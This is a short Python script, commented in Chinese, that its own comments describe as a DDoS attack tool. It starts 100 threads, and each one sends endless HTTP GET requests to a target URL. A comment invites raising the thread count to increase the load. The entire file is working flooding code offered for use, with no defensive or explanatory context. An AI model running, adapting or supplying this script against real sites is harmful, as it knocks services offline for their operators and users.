import threading
import requests

# 定義 DDoS 攻擊的目標URL
target_url = "http://example.com"  # 目標網站URL

# 這個函數用來發送大量的HTTP請求
def ddos_attack():
    while True:
        try:
            # 伺服器的 HTTP GET 請求
            response = requests.get(target_url)
            print(f"Sent request to {target_url} with status code {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error occurred: {e}")

# 攻擊發起的線程數量
num_threads = 100  # 可以根據需求增加線程數量

# 啟動多個線程來模擬分佈式攻擊
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=ddos_attack)
    thread.start()
    threads.append(thread)

# 等待所有線程完成
for thread in threads:
    thread.join()
